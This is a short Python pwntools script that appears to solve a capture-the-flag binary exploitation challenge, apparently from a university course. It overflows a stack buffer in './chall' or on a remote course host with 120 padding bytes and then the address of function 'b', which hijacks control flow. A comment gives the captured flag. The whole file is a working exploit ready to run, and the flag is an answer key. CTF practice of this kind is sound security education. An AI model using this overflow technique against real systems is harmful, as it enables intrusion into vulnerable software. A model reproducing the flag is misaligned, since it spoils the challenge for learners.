from pwn import *
import struct

BINARY = ['./chall']
IP, PORT = 'ctf99x.cs.ui.ac.id', 20001
LOCAL = True
DEBUG = False
if LOCAL:
    if DEBUG:
        p = gdb.debug(BINARY, '''
        b *input+25
        b *b+22
        ''')
    else:
        p = process(BINARY)
else:
    p = remote(IP, PORT)
e = ELF('chall')
target_address = p64(e.symbols["b"])
print(hex(e.symbols["b"]))
dummy = b'A' * (100 + 20)
payload = dummy + target_address
p.sendline(payload)

if LOCAL:
    sleep(2)
    print(p.recv().decode())
    pause()
else:
    print(p.recvall().decode())  # CSCE604258{lE81h_$Us4h_MaN@_BIkIN_5o@1_4p@_peCAHKAn_So4l}
